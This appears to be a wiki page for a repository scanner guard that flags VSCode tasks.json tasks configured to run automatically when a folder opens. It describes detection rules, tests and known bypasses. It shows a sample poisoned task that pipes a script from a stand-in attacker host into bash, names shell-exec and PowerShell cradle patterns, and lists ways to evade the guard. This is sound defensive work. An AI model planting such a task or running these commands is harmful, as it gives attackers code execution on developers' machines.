---
type: Guard
title: "vscode-tasks-auto-exec"
description: "VSCode task auto-executes on folder open with no user confirmation."
timestamp: "2026-10-20T00:00:00Z"
guard_id: "vscode-tasks-auto-exec"
checklist_section: ["4"]
standards: ["OWASP-LLM:LLM06", "OWASP:A03", "OWASP:A05", "OWASP:A08", "CWE-78"]
---

# VSCode task auto-executes on folder open with no user confirmation

_Author — 2026-09-16_

---

## The threat

VSCode's task runner supports `"runOptions": {"runOn": "folderOpen"}` on any task declared in
`.vscode/tasks.json`. A task with this option runs its `command` automatically the instant the
folder is opened in VSCode — no click, no "run task" action, no terminal confirmation. VSCode
shows a one-time-per-workspace trust prompt the first time an unknown folder is opened, but a
developer who has already trusted a workspace once (routine the moment they start working in a
cloned repo) gets zero further prompting on every subsequent open — including a fresh clone of the
same repo pulled by a teammate, or a CI checkout that opens the workspace programmatically.

This is a real, currently exploited propagation mechanism, not a hypothetical: it is the exact
secondary vector used in the 2026-05-11 TanStack/Mistral supply-chain attack, deployed alongside
`.claude/settings.json` `autoApprove: true` poisoning (CVE-2025-53773 — see `ai-instruction-
poisoning.md`, Rule 1). Where the `autoApprove` vector needs an AI coding agent in the loop to act
on a poisoned instruction, a `runOn: folderOpen` task needs nothing but VSCode itself: it fires for
every developer who opens the folder, agentic tooling or not, which is why the same attack used
both — one channel for AI-agent-assisted developers, one for everyone else.

Privilege: write access to `.vscode/tasks.json` (supply chain, malicious PR, compromised fork,
poisoned template repo). Effect: arbitrary command execution on the developer's machine (or a CI
runner that opens the workspace) with zero user action, the moment the folder is opened.

Standards: `folder-open-task` → `OWASP-LLM:LLM06` (Excessive Agency — an unattended auto-exec
trigger), `OWASP:A05` (Security Misconfiguration). `folder-open-suspicious-command` →
`OWASP:A03` (Injection), `OWASP:A08` (Software and Data Integrity Failures), `CWE-78` (OS
Command Injection) — the same standards `claude-code-compromise`'s reverse-shell rule carries,
since the underlying primitive (an auto-run command that fetches and executes remote content) is
the same class of bug.

---

## Why this guard fits the stack

`.vscode/tasks.json` is not gated on any detected stack feature — it can appear in any repo
VSCode is used to open, frontend, backend, or infra. The guard's `applies()` therefore returns
`True` unconditionally, the same posture `ai-instruction-poisoning` and `claude-code-compromise`
take for their own AI-coding-tool config surfaces.

A poisoned example (the canary plant):

```jsonc
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "bootstrap",
      "type": "shell",
      "command": "curl -s https://attacker.example.com/setup.sh | bash",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

---

## Detection design

1. **`applies()` gate** — returns `True` always (see above).

2. **Files scanned**: every file named `tasks.json` anywhere under the repo, filtered to those
   whose path includes a `.vscode` path segment (`iter_files_named(root, "tasks.json")`, then a
   `parts` check) — so an unrelated file merely *named* `tasks.json` outside `.vscode/` is not
   scanned.

3. **Parsing**: `.vscode/tasks.json` is genuine JSONC (JSON with Comments, VSCode's own dialect).
   `_strip_jsonc()` removes `//` line comments and `/* */` block comments in a quote-aware pass (a
   `//` inside a string value, e.g. a URL in `command`, is left untouched), and trailing commas are
   stripped before `json.loads()`. A file that still fails to parse (`JSONDecodeError` or
   `RecursionError`, mirroring `mcp_config_security.py`'s own JSON guard) is skipped — never a
   crash, never a false positive from a malformed file.

4. **The structural check**: for each object in the parsed `tasks` array, a task qualifies when
   `task["runOptions"]["runOn"] == "folderOpen"` exactly (case-sensitive, VSCode's own schema
   value — `"folderOpen"` is the only value that means unattended auto-exec; VSCode's other
   `runOn` value is `"default"`, meaning "only when explicitly invoked").

5. **The severity split** (see the guard module's own docstring for the full reasoning): a
   qualifying task's `command` (plus any `args`) is checked against three separate, deliberately
   *anchored* pattern groups — anchored because a bare substring match over-fired on ordinary
   commands (PR #890 review rounds 2–3):
   - `_SUSPICIOUS_COMMAND` — a download-and-run / shell-exec / obfuscated-payload shape: `curl`/`wget`
     to a non-loopback host, `nc`/`netcat`, a `/dev/tcp/` redirect, a base64-decode pipe, a PowerShell
     `IEX`/`Invoke-Expression` cradle, or `certutil ... -decode`.
   - **`eval` executing dynamic content** (`_SHELL_EVAL`): `eval` as its own word (not preceded by a
     word char, `.`, `/` or `-`) followed by whitespace and — through an optional wrapping quote — a
     `$`, backtick, or `(`. This fires on the realistic payload shapes `eval $X`, `bash -c "eval $X"`,
     `sh -c 'eval $(…)'`, ``eval `…` ``, `then eval $X`, `$(eval $X)`, but NOT on a hyphenated
     identifier that merely contains "eval" (`model-eval`, `eval-suite`, `npm run eval:strict`) or on
     "eval" appearing as prose/a literal search string after a quote (`echo "eval the results"`,
     `--grep 'eval'`). The anchor keys on the *dynamic operand* an `eval` payload always has.
   - **PowerShell encoded-command cradle** (`_PS_ENCODED_FLAG`, gated): fires only when a PowerShell
     launcher (`powershell`/`powershell.exe`/`pwsh`/`pwsh.exe`, `_POWERSHELL_CONTEXT`) is present in
     the same command, the `-EncodedCommand` flag appears in *any* of its 15 accepted prefix
     abbreviations (`-e`, `-ec`, `-en`, `-enc`, … `-encodedcommand` — PowerShell resolves any
     unambiguous prefix), AND the command carries no `-Command`/`-c`/`-File` wrapper
     (`_PS_COMMAND_ARG`). The launcher gate stops `-e`/`-enc` on an unrelated tool (`docker run -e`,
     `echo -e`, `grep -E`) reading as a cradle; the wrapper exclusion stops a `pwsh -c 'docker run -e
     …'` (where the `-e` belongs to the *wrapped* command, not powershell) from firing CRITICAL.

   Only ONE finding is emitted per qualifying task:
   - **Match** → `vscode-tasks-auto-exec/folder-open-suspicious-command`, **CRITICAL**, hard-fire
     (not a surfacing rule — this combination has no legitimate justification).
   - **No match** → `vscode-tasks-auto-exec/folder-open-task`, **MEDIUM**, declared via
     `surfacing_rule_prefixes = ("vscode-tasks-auto-exec/folder-open-task",)` — a review signal
     ("an auto-run task exists on folder open, confirm it is the build/watch step it looks like"),
     not a proven bug. Only this one rule is surfacing; the CRITICAL rule is not, so it still
     ranks as a proven finding in reports/CI gating.

5a. **Rule 3 — `launch-prelaunchtask-chains-dangerous-task` (CRITICAL, hard-fire)**: after the
   per-`tasks.json` pass above, every LABELED task that fired `folder-open-suspicious-command` is
   recorded per `.vscode/` directory. A sibling `launch.json` in the SAME directory is then parsed
   (same JSONC tolerance), and each debug configuration's `preLaunchTask` string is checked against
   that directory's dangerous-label set. A match fires — starting ANY debug session (F5) reaches
   the identical dangerous command, a second and independent trigger beyond `runOn: folderOpen`, so
   removing the folderOpen trigger alone does not neutralize the task. (Named incident: the 2025
   `keyv` npm-package worm used exactly this VSCode auto-task-execution surface as a secondary
   propagation vector; no CVE was assigned.) Scope is deliberately narrow: only a task this guard
   already proved dangerous (not merely folderOpen, and not an unlabeled task, since nothing can
   reference it by name) is checked — a `preLaunchTask` referencing an otherwise-ordinary task is
   not this guard's concern.

6. **Location**: each `"runOn": "folderOpen"` line-match (in file order) is paired with the
   correspondingly-indexed parsed task (in document order) to report a real `path:line` when the
   counts agree (the common case — one such key per qualifying task); it falls back to the bare
   file path, never a wrong line, if they disagree.

7. **Opt-out pragma**: `// security: allow-vscode-tasks-auto-exec` (or a `/* */` block comment)
   anywhere in `tasks.json` or `launch.json` suppresses the whole file. Both are JSONC, so the pragma
   is read on the `js` comment view, whose `//`, `/* */` and double-quoted-string grammar is JSONC's
   (#1040 T5): the phrase inside a JSON string, such as a task's `label`, `command` or `args`, does
   not suppress. It used to match the raw text, where it did.

---

## When NOT to flag

- A task with no `runOptions` at all, or `runOptions.runOn` set to anything other than the exact
  string `"folderOpen"` (VSCode's `"default"` value, or a typo/other value) — never auto-executes,
  not flagged.
- A `tasks.json` that is not under a `.vscode/` directory — this guard only cares about the real
  VSCode task-runner file, not an unrelated file that happens to share the name.
- `curl`/`wget` targeting `localhost`/`127.0.0.1`/`0.0.0.0`/`[::1]` — a local dev-server health
  check on folder open is not an exfil/download-and-run pattern; it still fires the MEDIUM review
  rule (the auto-exec trigger itself is still worth a human glance) but not the CRITICAL rule.
- A malformed/unparseable `tasks.json` — skipped, not flagged (a parse failure is not evidence of
  a violation).
- Use the pragma `// security: allow-vscode-tasks-auto-exec` for a confirmed-safe auto-exec task
  (e.g. a legitimate `npm run watch` bootstrap the team has reviewed).
- A `launch.json` `preLaunchTask` naming a task that did NOT fire the CRITICAL suspicious-command
  rule (a benign folderOpen task, or a task with no `runOn` at all) — Rule 3 only correlates
  against already-proven-dangerous, labeled tasks.

---

## Tests

| Test | What it checks |
|---|---|
| `test_suspicious_curl_pipe_bash_fires_critical` | runOn: folderOpen + curl\|bash fires CRITICAL |
| `test_suspicious_command_line_number_reported` | finding location includes a line number |
| `test_suspicious_netcat_fires_critical` | netcat command also fires the suspicious rule |
| `test_suspicious_command_only_one_finding_per_task` | Rule 2 supersedes Rule 1 on the same task |
| `test_benign_folder_open_task_fires_medium_review` | npm watch + folderOpen fires Rule 1 (MEDIUM) only |
| `test_benign_folder_open_task_is_surfacing_rule` | Rule 1 is in `surfacing_rule_prefixes`, Rule 2 is not |
| `test_localhost_curl_is_not_suspicious` | curl to localhost fires Rule 1 only, not Rule 2 |
| `test_task_without_run_on_is_silent` | a normal build task with no runOptions is silent |
| `test_run_on_other_than_folder_open_is_silent` | runOn: default is silent |
| `test_tasks_json_outside_vscode_dir_is_ignored` | a file merely named tasks.json elsewhere is ignored |
| `test_jsonc_comments_are_tolerated` | `//` comments + trailing commas still parse and fire |
| `test_url_containing_double_slash_survives_comment_stripping` | a `//` inside a URL string is not treated as a comment |
| `test_pragma_suppresses` | the inline pragma silences the guard |
| `test_malformed_json_does_not_crash` | a malformed file degrades to a skip, not a crash |
| `test_applies_always_true` | guard applies to all stack profiles |
| `test_empty_repo_is_silent` | empty repo produces no findings |
| `test_suspicious_fires_in_gitignored_vscode_dir` | a gitignored `.vscode/` (respect_gitignore=False) still fires CRITICAL |
| `test_gitignored_vscode_scan_stays_silent_on_benign_task` | FP-bait: a benign task in a gitignored `.vscode/` stays MEDIUM |
| `test_loopback_lookalike_host_fires_critical` | `localhost.attacker.example.com` is remote, fires CRITICAL (anchored loopback) |
| `test_suspicious_command_in_quoted_string_args_fires_critical` | payload in ShellQuotedString `args` objects fires CRITICAL |
| `test_powershell_encoded_command_still_fires_critical` | `powershell -enc <b64>` cradle fires CRITICAL |
| `test_powershell_encodedcommand_full_flag_still_fires_critical` | the unabbreviated `-EncodedCommand` also fires |
| `test_docker_run_dash_e_is_not_suspicious` | FP-bait: `docker run -e` (env flag) stays MEDIUM |
| `test_echo_dash_e_is_not_suspicious` | FP-bait: `echo -e` (escape flag) stays MEDIUM |
| `test_grep_dash_E_is_not_suspicious` | FP-bait: `grep -E` (extended-regex flag) stays MEDIUM |
| `test_shell_eval_command_initial_still_fires_critical` | command-initial `eval $(…)` fires CRITICAL |
| `test_shell_eval_after_operator_still_fires_critical` | `… && eval "$X"` (dynamic operand) fires CRITICAL |
| `test_npm_run_model_eval_is_not_suspicious` | FP-bait: `model-eval` script name stays MEDIUM |
| `test_eval_suite_script_is_not_suspicious` | FP-bait: `eval-suite` script name stays MEDIUM |
| `test_eval_in_wrapped_bash_c_string_fires_critical` | H-1: `bash -c "eval $X"` fires CRITICAL |
| `test_eval_in_wrapped_sh_c_string_fires_critical` | H-1: `sh -c 'eval $(…)'` fires CRITICAL |
| `test_eval_in_backticks_fires_critical` | H-1: `` `eval $X` `` fires CRITICAL |
| `test_eval_after_then_keyword_fires_critical` | H-1: `then eval $X` fires CRITICAL |
| `test_eval_in_subshell_fires_critical` | H-1: `$(eval $X)` fires CRITICAL |
| `test_eval_in_quoted_prose_stays_silent` | H-1 FP-bait: `echo "eval the results"` stays MEDIUM |
| `test_eval_as_grep_literal_stays_silent` | H-1 FP-bait: `--grep 'eval'` stays MEDIUM |
| `test_powershell_all_encodedcommand_abbreviations_fire` | M-1: all 15 `-EncodedCommand` prefixes fire CRITICAL |
| `test_powershell_encodedcommand_lookalike_switches_stay_silent` | M-1 FP-bait: `-ExecutionPolicy`/`-Encoding`/… stay MEDIUM |
| `test_pwsh_wrapped_docker_run_dash_e_stays_silent` | M-2 FP-bait: `pwsh -c 'docker run -e …'` stays MEDIUM |
| `test_powershell_command_wrapping_echo_dash_e_stays_silent` | M-2 FP-bait: `powershell -Command "echo -e …"` stays MEDIUM |
| `test_real_encoded_command_cradle_without_wrapper_still_fires` | M-2 still-fires: real `-enc <b64>` cradle (no wrapper) fires CRITICAL |
| `test_launch_json_prelaunchtask_chains_dangerous_task_fires_critical` | Rule 3: `launch.json` preLaunchTask naming a dangerous task fires CRITICAL |
| `test_launch_json_prelaunchtask_referencing_benign_task_stays_silent` | Rule 3 FP-bait: preLaunchTask naming a benign task stays silent |
| `test_launch_json_with_unrelated_prelaunchtask_stays_silent` | Rule 3 FP-bait: preLaunchTask naming an unrelated/nonexistent task stays silent |
| `test_launch_json_pragma_suppresses` | Rule 3: the inline pragma on `launch.json` silences it |

---

## Known bypasses

- A task whose dangerous command is built dynamically (referencing a variable, an included script,
  or an npm script defined elsewhere that itself fetches remote content) rather than spelled out
  literally in `command`/`args` — this guard reads the JSON structure, not what a referenced script
  does.
- A payload delivery mechanism this guard's pattern set does not name (an unusual downloader, a
  compiled helper binary already present in the repo, a language-specific one-liner not covered by
  the curl/wget/nc/base64/eval/PowerShell set).
- Unicode homoglyphs or zero-width characters inside the command string that a human reviewer
  would visually miss but that also evade the literal regex match.
- The pragma can be added by the same attacker who plants the violation, if they have write access
  to the file — the same disclosed limitation every pragma-based guard in this codebase carries.
- A `runOn: folderOpen` task added to a *different* auto-loaded VSCode config surface this guard
  does not scan (e.g. a workspace-level `.code-workspace` file's own `tasks` block, rather than
  `.vscode/tasks.json`).
- **A `-EncodedCommand` cradle nested inside a `-Command`/`-c`/`-File` wrapper** (e.g. `powershell
  -Command "powershell -enc <b64>"`) is deliberately not read as a cradle by the PowerShell clause.
  The presence of a `-Command`/`-File` wrapper is what tells the guard the later `-e`/`-enc` belongs
  to the *wrapped* command (killing the common `pwsh -c 'docker run -e …'` / `powershell -Command
  "echo -e …"` false positives); a real `-EncodedCommand` cradle never co-occurs with `-Command`
  (they are mutually exclusive). This contrived double-nesting is base64-opaque anyway and is left to
  the `IEX`/`curl`/`base64` clauses — see the `_PS_COMMAND_ARG` comment. It is an accepted trade for
  closing the common pwsh-wrapped `-e` false positive.
- **A static-literal `eval` with no dynamic operand** (`eval somecommand`, no `$`/backtick/`$(…)`)
  is not matched by the `eval` clause, which anchors on the dynamic operand a real payload always
  carries. This is an unrealistic payload shape (a literal `eval` of a fixed string is pointless),
  and any such command that carries a real marker (`curl`, `base64`, `IEX`, …) still fires via the
  other clauses. The trade is what lets `bash -c "eval $X"` fire while `echo "eval the results"`
  stays silent.
- The `_TRAILING_COMMA` comma-stripping pass (`,` before `}`/`]`) is a blind `re.sub`, not
  quote-aware like `_strip_jsonc` — a literal `,]`/`,}` sequence *inside* a string value is rewritten
  before `json.loads`. In practice this only ever makes an otherwise-valid file parse (it never
  suppresses a finding: the reconstructed structure is what VSCode itself would run), but it is a
  known deviation from a strict quote-aware parse.
- The `curl`/`wget` clause rescans the remainder of the command per `curl`/`wget` token, so a
  pathologically long hostile `command` string can be made superlinear (a shared pattern with
  `claude-code-compromise.md`, tracked in issue #927). The attacker writes the file, so this is in
  the threat model; the linear `_SHELL_EVAL`/`_PS_ENCODED_FLAG` patterns added in this guard are not
  affected.
- **Rule 3 only correlates by task LABEL.** A `preLaunchTask` reference is a plain string match
  against the dangerous-label set; it does not resolve VSCode's `${input:...}`/variable
  substitution inside a label, and an UNLABELED dangerous task can never be referenced by Rule 3 at
  all (VSCode itself requires a label to reference a task, so this is not a detection gap — an
  unlabeled task simply cannot be a `preLaunchTask` target).
- **Rule 3 is same-directory only**: a `launch.json` and `tasks.json` in different `.vscode/`
  directories (a monorepo with multiple workspace roots) are not correlated across directories.

---

## What this guard does NOT prove

- That a flagged MEDIUM task (Rule 1) is actually malicious — it is a review signal only; a
  legitimate build/watch/dev-server bootstrap looks structurally identical to this guard.
- Runtime behavior: the guard reads static configuration at scan time. A task's command could be
  reconfigured to something dangerous after the scan, or the command string could resolve
  differently depending on environment variables not visible in the file.
- Safety of any OTHER VSCode auto-run surface beyond the narrow `launch.json` `preLaunchTask`
  correlation Rule 3 adds — extension recommendations, workspace trust settings, or a `launch.json`
  configuration's OTHER auto-run fields (`postDebugTask`, `serverReadyAction`) are out of scope.
- Whether the developer's VSCode installation actually has Workspace Trust enabled — a developer
  or CI environment with trust disabled entirely removes even the one-time prompt this guard's
  threat model already treats as bypassed in practice.

# Citations

[1] agentsec checklist item `4-vscode-tasks-no-auto-exec` (§4)
[2] `wiki/guards/ai-instruction-poisoning.md` — the sibling CVE-2025-53773 `autoApprove` vector
    used in the same 2026-05-11 TanStack/Mistral attack
[3] `wiki/guards/claude-code-compromise.md` — the reverse-shell/exfil pattern family this guard's
    Rule 2 draws its command-shape categories from
[4] OWASP-LLM:LLM06
[5] OWASP:A03
[6] OWASP:A05
[7] OWASP:A08
[8] CWE-78
